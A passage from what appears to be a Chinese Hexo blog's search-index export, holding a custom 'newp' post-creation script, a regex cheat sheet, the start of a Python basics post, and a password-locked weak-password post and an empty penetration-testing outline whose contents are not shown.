class="attribute">height</span>: <span class="number">20px</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">3px</span> solid <span class="built_in">rgba</span>(<span class="number">75</span>, <span class="number">108</span>, <span class="number">183</span>, <span class="number">0.2</span>);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">border-top-color</span>: <span class="number">#4b6cb7</span>;</span><br><span class="line">  <span class="attribute">animation</span>: spin <span class="number">1s</span> ease-in-out infinite;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">@keyframes</span> spin &#123;</span><br><span class="line">  <span class="selector-tag">to</span> &#123; <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">360deg</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保持分类列表从左往右分布 */</span></span><br><span class="line"><span class="selector-class">.category-all-page</span> <span class="selector-class">.category-all</span> &#123;</span><br><span class="line">  <span class="attribute">direction</span>: ltr;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#categoryPostsContainer</span> &#123;</span><br><span class="line">  <span class="selector-class">.posts-collapse</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">20px</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
        <category>Hexo</category>
      </categories>
  </entry>
  <entry>
    <title>【弱口令】弱口令总结</title>
    <url>/posts/960078f8/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Wrong password, please try again.Or you can contact the author to view the blog" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="e053ab8a5d96b2831f04b234fe5db5fb189a42991560395f5bb6cd1440ef981e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>渗透测试</category>
        <category>弱口令</category>
      </categories>
      <tags>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>【Hexo】自定义newp命令及显示当前文件夹文件</title>
    <url>/posts/60f39975/</url>
    <content><![CDATA[<p>因为我是用了根据路径自动生成分类，但是使用<code>hexo new -p /path/to/filename title</code>命令的时候感觉很不方便，因为我希望我可以在同级目录下生成名字和标题一样的<code>.md</code>文件和文件夹。但是使用<code>-p</code>参数的时候我就得这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new -p 渗透测试/弱口令/【渗透测试】弱口令 【渗透测试】弱口令</span><br></pre></td></tr></table></figure>
<p>我得敲两遍标题，而且使用<code>-p</code>的时候不显示当前目录下的文件夹有哪些。觉得很不方便。因此我打算为我的hexo实现两个功能：</p>
<ol>
<li class="lvl-3">
<p>当我执行：<code>hexo newp first/second/title</code>  的时候，会在<code>_post/first/second/</code>下生成<code>【second】title</code>文件夹和<code>【second】title.md</code>文件，文章标题拼接为<code>【second】title</code></p>
</li>
<li class="lvl-3">
<p>在选择路径的时候按<code>Tab</code>键时，能像操作系统终端一样：</p>
<ol>
<li class="lvl-6">若只有一条路径符合我已经输入的路径，则自动补全。</li>
<li class="lvl-6">若有多个目录符合我已经输入的路径，打印符合要求的所有路径。</li>
</ol>
</li>
</ol>
<p>经过不断的测试，我满足了我的需求，顿时觉得爽了很多。实现这两个功能的代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> readline = <span class="built_in">require</span>(<span class="string">&#x27;readline&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; promisify &#125; = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mkdir = <span class="title function_">promisify</span>(fs.<span class="property">mkdir</span>);</span><br><span class="line"><span class="keyword">const</span> writeFile = <span class="title function_">promisify</span>(fs.<span class="property">writeFile</span>);</span><br><span class="line"><span class="keyword">const</span> readdir = <span class="title function_">promisify</span>(fs.<span class="property">readdir</span>);</span><br><span class="line"><span class="keyword">const</span> readFile = <span class="title function_">promisify</span>(fs.<span class="property">readFile</span>);</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">console</span>.<span class="title function_">register</span>(<span class="string">&#x27;newp&#x27;</span>, <span class="string">&#x27;Create new post with path (e.g., first/second/title)&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">options</span>: [</span><br><span class="line">    &#123; <span class="attr">name</span>: <span class="string">&#x27;--auto-complete&#x27;</span>, <span class="attr">desc</span>: <span class="string">&#x27;Enable tab completion&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> log = hexo.<span class="property">log</span> || <span class="variable language_">console</span>.<span class="property">log</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (args.<span class="property">autoComplete</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">tabComplete</span>(args);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> fullPath = args.<span class="property">_</span>[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (!fullPath) &#123;</span><br><span class="line">    log.<span class="title function_">error</span>(<span class="string">&#x27;Usage: hexo newp &lt;path/levels/title&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 处理 Windows 路径分隔符问题</span></span><br><span class="line">  <span class="keyword">const</span> normalizedPath = fullPath.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> parts = normalizedPath.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> title = parts.<span class="title function_">pop</span>();</span><br><span class="line">  <span class="keyword">const</span> category = parts.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> lastDir = parts[parts.<span class="property">length</span> - <span class="number">1</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成文件夹名和文件名</span></span><br><span class="line">  <span class="keyword">const</span> folderName = <span class="string">`【<span class="subst">$&#123;lastDir&#125;</span>】<span class="subst">$&#123;title&#125;</span>`</span>;</span><br><span class="line">  <span class="keyword">const</span> fileName = <span class="string">`<span class="subst">$&#123;folderName&#125;</span>.md`</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建目录结构 - 确保文件夹和文件在同一层级</span></span><br><span class="line">  <span class="keyword">const</span> baseDir = path.<span class="title function_">join</span>(hexo.<span class="property">source_dir</span>, <span class="string">&#x27;_posts&#x27;</span>, category);</span><br><span class="line">  <span class="keyword">const</span> folderPath = path.<span class="title function_">join</span>(baseDir, folderName);</span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(baseDir, fileName);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 创建文件夹（用于存放资源）</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">mkdir</span>(folderPath, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用模板文件</span></span><br><span class="line">    <span class="keyword">const</span> templatePath = path.<span class="title function_">join</span>(hexo.<span class="property">scaffold_dir</span>, <span class="string">&#x27;post.md&#x27;</span>);</span><br><span class="line">    <span class="keyword">let</span> templateContent;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      templateContent = <span class="keyword">await</span> <span class="title function_">readFile</span>(templatePath, <span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="comment">// 如果模板文件不存在，使用默认模板</span></span><br><span class="line">      templateContent = [</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;title: &#123;&#123; title &#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;date: &#123;&#123; date &#125;&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;categories:&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tags:&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;- private&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;description: 声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;top:&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;comments: true&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;---&#x27;</span></span><br><span class="line">      ].<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 替换模板中的标题</span></span><br><span class="line">    <span class="keyword">const</span> content = templateContent</span><br><span class="line">      .<span class="title function_">replace</span>(<span class="regexp">/&#123;&#123; title &#125;&#125;/g</span>, folderName)</span><br><span class="line">      <span class="comment">//.replace(/&#123;&#123; date &#125;&#125;/g, new Date().toISOString());</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建 Markdown 文件</span></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">writeFile</span>(filePath, content);</span><br><span class="line">    </span><br><span class="line">    log.<span class="title function_">info</span>(<span class="string">`Created folder: <span class="subst">$&#123;folderPath&#125;</span>`</span>);</span><br><span class="line">    log.<span class="title function_">info</span>(<span class="string">`Created file: <span class="subst">$&#123;filePath&#125;</span>`</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    log.<span class="title function_">error</span>(<span class="string">`Error creating post: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tab 补全逻辑保持不变</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">console</span>.<span class="property">tabComplete</span> = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">args</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> rl = readline.<span class="title function_">createInterface</span>(&#123;</span><br><span class="line">    <span class="attr">input</span>: process.<span class="property">stdin</span>,</span><br><span class="line">    <span class="attr">output</span>: process.<span class="property">stdout</span>,</span><br><span class="line">    <span class="attr">completer</span>: <span class="title function_">async</span> (line) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> partial = line.<span class="title function_">trim</span>().<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> baseDir = path.<span class="title function_">join</span>(hexo.<span class="property">source_dir</span>, <span class="string">&#x27;_posts&#x27;</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">const</span> matches = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">findMatches</span>(baseDir, partial);</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (matches.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> completed = matches[<span class="number">0</span>] + <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> [[completed], completed];</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (matches.<span class="property">length</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n&#x27;</span> + matches.<span class="title function_">join</span>(<span class="string">&#x27;\n&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> [matches, line];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  rl.<span class="title function_">question</span>(<span class="string">&#x27;Enter post path: &#x27;</span>, <span class="function">(<span class="params">line</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (line.<span class="title function_">trim</span>()) &#123;</span><br><span class="line">      hexo.<span class="title function_">call</span>(<span class="string">&#x27;newp&#x27;</span>, &#123; <span class="attr">_</span>: [line.<span class="title function_">trim</span>()] &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        rl.<span class="title function_">close</span>();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      rl.<span class="title function_">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 路径匹配函数保持不变</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">console</span>.<span class="property">findMatches</span> = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params">baseDir, partialPath</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> parts = partialPath.<span class="title function_">split</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  <span class="keyword">let</span> currentDir = baseDir;</span><br><span class="line">  <span class="keyword">let</span> existingPath = [];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> part <span class="keyword">of</span> parts.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!part) <span class="keyword">continue</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> testDir = path.<span class="title function_">join</span>(currentDir, part);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(testDir)) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">const</span> stat = fs.<span class="title function_">statSync</span>(testDir);</span><br><span class="line">      <span class="keyword">if</span> (!stat.<span class="title function_">isDirectory</span>()) <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      currentDir = testDir;</span><br><span class="line">      existingPath.<span class="title function_">push</span>(part);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">const</span> lastPartial = parts[parts.<span class="property">length</span> - <span class="number">1</span>] || <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">let</span> dirContents = [];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    dirContents = <span class="keyword">await</span> <span class="title function_">readdir</span>(currentDir, &#123; <span class="attr">withFileTypes</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="keyword">return</span> [];</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> dirContents</span><br><span class="line">    .<span class="title function_">filter</span>(<span class="function"><span class="params">dirent</span> =&gt;</span> dirent.<span class="title function_">isDirectory</span>())</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">dirent</span> =&gt;</span> dirent.<span class="property">name</span>)</span><br><span class="line">    .<span class="title function_">filter</span>(<span class="function"><span class="params">name</span> =&gt;</span> name.<span class="title function_">startsWith</span>(lastPartial))</span><br><span class="line">    .<span class="title function_">map</span>(<span class="function"><span class="params">name</span> =&gt;</span> [...existingPath, name].<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只需要创建js文件：<code>\blog\scripts\newp.js</code>，将代码复制粘贴进去就可以了。</p>
<p>最终效果如下：</p>
<p><img src="/posts/60f39975//image-20250723143513850.png" alt="image-20250723143513850"></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
  </entry>
  <entry>
    <title>【渗透思路】总结</title>
    <url>/posts/cc26bc47/</url>
    <content><![CDATA[<h2 id="信息搜集">信息搜集</h2>
<p>域名、ip、目录、</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>渗透思路</category>
      </categories>
  </entry>
  <entry>
    <title>【通用知识】正则表达式</title>
    <url>/posts/7a19b1ff/</url>
    <content><![CDATA[<hr>
<h2 id="基础字符匹配"><strong>基础字符匹配</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>abc</code></td>
<td>匹配连续字符 “abc”</td>
<td><code>abc</code> → “abc”</td>
</tr>
<tr>
<td><code>[abc]</code></td>
<td>匹配 a、b 或 c 中的任意字符</td>
<td><code>[ae]</code> → “a”（在 “apple” 中）</td>
</tr>
<tr>
<td><code>[^abc]</code></td>
<td>匹配<strong>非</strong> a、b、c 的字符</td>
<td><code>[^ap]</code> → “l”（在 “apple” 中）</td>
</tr>
<tr>
<td><code>[a-z]</code></td>
<td>匹配任意小写字母</td>
<td><code>[a-c]</code> → “a”、“b”、“c”</td>
</tr>
<tr>
<td><code>.</code></td>
<td>匹配<strong>任意单个字符</strong>（换行符除外）</td>
<td><code>a.c</code> → “abc”、“aac”</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="预定义字符类"><strong>预定义字符类</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>等价写法</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\d</code></td>
<td>数字（0-9）</td>
<td><code>[0-9]</code></td>
</tr>
<tr>
<td><code>\D</code></td>
<td><strong>非</strong>数字</td>
<td><code>[^0-9]</code></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>单词字符（字母、数字、下划线）</td>
<td><code>[a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td><code>\W</code></td>
<td><strong>非</strong>单词字符</td>
<td><code>[^\w]</code></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>空白字符（空格、制表符、换行符）</td>
<td><code>[ \t\n\r]</code></td>
</tr>
<tr>
<td><code>\S</code></td>
<td><strong>非</strong>空白字符</td>
<td><code>[^\s]</code></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="边界匹配"><strong>边界匹配</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>^</code></td>
<td>字符串<strong>开始</strong></td>
<td><code>^abc</code> → “abc”（需在开头）</td>
</tr>
<tr>
<td><code>$</code></td>
<td>字符串<strong>结束</strong></td>
<td><code>end$</code> → “end”（需在结尾）</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>单词边界</td>
<td><code>\bcat\b</code> → “cat”（不匹配 “catalog”）</td>
</tr>
<tr>
<td><code>\B</code></td>
<td><strong>非</strong>单词边界</td>
<td><code>\Bcat\B</code> → “cat”（在 “scatter” 中）</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="重复匹配"><strong>重复匹配</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>匹配 <strong>0 次或多次</strong></td>
<td><code>a*</code> → “”、“a”、“aa”</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配 <strong>1 次或多次</strong></td>
<td><code>a+</code> → “a”、“aa”（不匹配空）</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配 <strong>0 次或 1 次</strong></td>
<td><code>a?</code> → “”、“a”</td>
</tr>
<tr>
<td><code>&#123;n&#125;</code></td>
<td>匹配 <strong>n 次</strong></td>
<td><code>a&#123;3&#125;</code> → “aaa”</td>
</tr>
<tr>
<td><code>&#123;n,&#125;</code></td>
<td>匹配 <strong>至少 n 次</strong></td>
<td><code>a&#123;2,&#125;</code> → “aa”、“aaa”</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;</code></td>
<td>匹配 <strong>n 到 m 次</strong></td>
<td><code>a&#123;2,4&#125;</code> → “aa”、“aaa”</td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong>贪婪模式</strong>（默认）：尽可能多匹配（<code>a.*b</code> 在 “axbxb” 中匹配整个字符串）。<br>
<strong>非贪婪模式</strong>：加 <code>?</code> 尽可能少匹配（<code>a.*?b</code> → “axb”）。</p>
</blockquote>
<hr>
<h2 id="分组与捕获"><strong>分组与捕获</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>(exp)</code></td>
<td>捕获分组，后续可引用</td>
<td><code>(abc)+</code> → “abcabc”</td>
</tr>
<tr>
<td><code>(?:exp)</code></td>
<td><strong>非捕获分组</strong>（不存储）</td>
<td>`(?:abc)</td>
</tr>
<tr>
<td><code>\n</code></td>
<td>引用第 n 个分组</td>
<td><code>(a)\1</code> → “aa”（匹配连续两个相同字符）</td>
</tr>
<tr>
<td><code>(?&lt;name&gt;exp)</code></td>
<td>命名分组（通过名称引用）</td>
<td><code>(?&lt;num&gt;\d+)</code> → 捕获数字并命名为 “num”</td>
</tr>
</tbody>
</table>
<p><font class="notice">注：在真实大数据场景中，非捕获分组通常更快更可靠。</font></p>
<hr>
<h2 id="选择与断言"><strong>选择与断言</strong></h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>`</td>
<td>`</td>
<td><strong>或</strong>逻辑</td>
</tr>
<tr>
<td><code>(?=exp)</code></td>
<td><strong>正向先行断言</strong>（后面是 exp）</td>
<td><code>a(?=b)</code> → “a”（仅当后跟 “b” 时）</td>
</tr>
<tr>
<td><code>(?!exp)</code></td>
<td><strong>负向先行断言</strong>（后面不是 exp）</td>
<td><code>a(?!b)</code> → “a”（当后跟非 “b” 时）</td>
</tr>
<tr>
<td><code>(?&lt;=exp)</code></td>
<td><strong>正向后行断言</strong>（前面是 exp）</td>
<td><code>(?&lt;=a)b</code> → “b”（仅当前有 “a” 时）</td>
</tr>
<tr>
<td><code>(?&lt;!exp)</code></td>
<td><strong>负向后行断言</strong>（前面不是 exp）</td>
<td><code>(?&lt;!a)b</code> → “b”（当前不是 “a” 时）</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="转义与特殊字符"><strong>转义与特殊字符</strong></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>元字符需转义：<code>\.</code>、<code>\*</code>、<code>\(</code>、<code>\)</code>、<code>\[</code>、<code>\\</code> 等。</p>
</li>
<li class="lvl-2">
<p>特殊序列：</p>
<ul class="lvl-2">
<li class="lvl-4"><code>\t</code>：制表符</li>
<li class="lvl-4"><code>\n</code>：换行符</li>
<li class="lvl-4"><code>\r</code>：回车符</li>
<li class="lvl-4"><code>\x21</code>：十六进制字符（如 <code>!</code>）</li>
<li class="lvl-4"><code>\u4E00</code>：Unicode 字符（如 “一”）</li>
</ul>
</li>
</ul>
<hr>
<h2 id="标志（Flags）"><strong>标志（Flags）</strong></h2>
<table>
<thead>
<tr>
<th>标志</th>
<th>说明</th>
<th>示例（全局搜索）</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>i</code></td>
<td>忽略大小写</td>
<td><code>/aBc/i</code> → “abc”、“ABC”</td>
</tr>
<tr>
<td><code>g</code></td>
<td>全局匹配（所有结果）</td>
<td><code>a</code> 在 “aaa” 中匹配 3 次</td>
</tr>
<tr>
<td><code>m</code></td>
<td>多行模式（<code>^</code>/<code>$</code> 匹配每行）</td>
<td><code>^a</code> 匹配每行开头的 “a”</td>
</tr>
<tr>
<td><code>s</code></td>
<td>单行模式（<code>.</code> 匹配换行符）</td>
<td><code>a.c</code> → “a\nc”（当 <code>s</code> 启用）</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="常用正则示例"><strong>常用正则示例</strong></h2>
<p><strong>邮箱验证</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">^[a-zA-<span class="variable constant_">Z0</span>-<span class="number">9.</span>_%+-]+@[a-zA-<span class="variable constant_">Z0</span>-<span class="number">9.</span>-]+\.[a-zA-Z]&#123;<span class="number">2</span>,&#125;$</span><br></pre></td></tr></table></figure>
<p><strong>URL 提取</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">https?:<span class="comment">//[^\s/$.?#]+\.[^\s]+</span></span><br></pre></td></tr></table></figure>
<p><strong>日期匹配（YYYY-MM-DD）</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\d&#123;<span class="number">4</span>&#125;-\d&#123;<span class="number">2</span>&#125;-\d&#123;<span class="number">2</span>&#125;</span><br></pre></td></tr></table></figure>
<p><strong>中文汉字</strong>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[\u4e00-\u9fa5]</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="工具与学习资源"><strong>工具与学习资源</strong></h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>在线测试工具</strong>：</p>
<ul class="lvl-2">
<li class="lvl-4"><a href="https://regex101.com/">Regex101</a></li>
<li class="lvl-4"><a href="https://regexr.com/">RegExr</a></li>
</ul>
</li>
<li class="lvl-2">
<p><strong>学习资料</strong>：</p>
<ul class="lvl-2">
<li class="lvl-4">《精通正则表达式》（Jeffrey Friedl）</li>
<li class="lvl-4"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">MDN 正则文档</a></li>
</ul>
</li>
</ul>
<p>掌握正则表达式可大幅提升文本处理效率！建议从实际案例入手练习，逐步熟悉复杂语法。</p>
<p>本文参考：</p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>基础知识</category>
      </categories>
  </entry>
  <entry>
    <title>【Python】Python基础</title>
    <url>/posts/731b144e/</url>
    <content><![CDATA[<h2 id="Python概述">Python概述</h2>
<h2 id="pycharm常用快捷键：">pycharm常用快捷键：</h2>
<table>
<thead>
<tr>
<th>作用</th>
<th>快捷键</th>
<th>作用</th>
<th>快捷键</th>
</tr>
</thead>
<tbody>
<tr>
<td>单行注释</td>
<td>Ctrl + /</td>
<td>复制当前光标所在行</td>
<td>Ctrl + D</td>
</tr>
<tr>
<td>格式化代码</td>
<td>Ctrl + Alt + L</td>
<td>删除当前光标所在行</td>
<td>Ctrl + X</td>
</tr>
<tr>
<td>全局查找</td>
<td>Ctrl + Shift + R</td>
<td>返回至上次浏览的位置</td>
<td>Ctrl + Alt + left/right</td>
</tr>
<tr>
<td>快速选中代码</td>
<td>Ctrl + W</td>
<td>替换</td>
<td>Ctrl + R</td>
</tr>
</tbody>
</table>
<h2 id="标识符与关键字：">标识符与关键字：</h2>
<h3 id="标识符">标识符</h3>
<p>标识符就是一个名字，就好像每个人都有自己的名字；主要作用是作为程序中变量、函数、类、模块以及其他对象的调用名称。</p>
<p>Python中标识符的命名要遵守一定的命名规则：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>标识符由字母、下划线和数字组成，但不能以数字开头。</p>
</li>
<li class="lvl-2">
<p>标识符不能和 Python中关键字等相同。</p>
</li>
<li class="lvl-2">
<p>标识符严格区分大小写，例：Corazon和corazon是不同标识符。</p>
</li>
<li class="lvl-2">
<p>以下划线开头标识符往往有特殊含义。</p>
</li>
</ul>
<h3 id="关键字">关键字</h3>
<p>关键字就是Pytnon内部已经定义好的具有特殊意义的标识符，开发人员不能重复定义。</p>
<p>Python3的关键字可以通过keyword模块的变量kwlist查看：</p>
